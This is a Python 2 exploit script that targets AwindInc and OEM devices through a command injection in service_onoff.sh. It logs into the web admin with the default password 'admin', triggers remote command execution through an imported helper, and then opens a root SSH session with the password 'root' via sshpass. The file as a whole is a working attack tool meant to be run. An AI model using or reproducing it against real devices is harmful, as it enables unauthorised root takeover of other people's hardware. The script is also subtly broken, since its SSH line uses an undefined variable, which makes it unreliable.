#!/usr/bin/env python
"""
This module exploits a vulnerability found in AwindInc and OEM'ed products
where untrusted inputs are fed to service_onoff.sh system command,
leading to command injection.

"""
import sys
import os
from awind import Target

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "Usage: %s target" % sys.argv[0]
        sys.exit(1)
    try:
        ip = sys.argv[1]
        t = Target(ip)
        t.fingerprint()
        session_token = t.login_webadmin(password="admin")
        if session_token is not None:
            print "[+] Successfully logged in. Session token is %s" % session_token
            print "[+] Injecting commands ..."
            t.rce_http()
            print "[+] Connecting over SSH"
            os.system("sshpass -p root ssh root@%s" % target)
    except Exception as e:
        print "[!] %s" % e.message
        sys.exit(1)

